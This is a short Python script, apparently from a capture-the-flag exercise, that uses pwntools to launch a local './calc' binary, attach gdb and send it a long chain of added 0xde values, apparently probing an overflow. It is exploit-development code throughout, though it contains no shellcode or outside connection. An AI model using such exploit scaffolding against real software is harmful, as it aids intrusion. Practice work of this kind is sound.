from pwn import *

p = process("./calc")

payload = ""
for i in range(99):
  payload += str(0xde) + "+"
payload += str(0xde)
gdb.attach(p)
p.sendline(payload)

p.interactive()
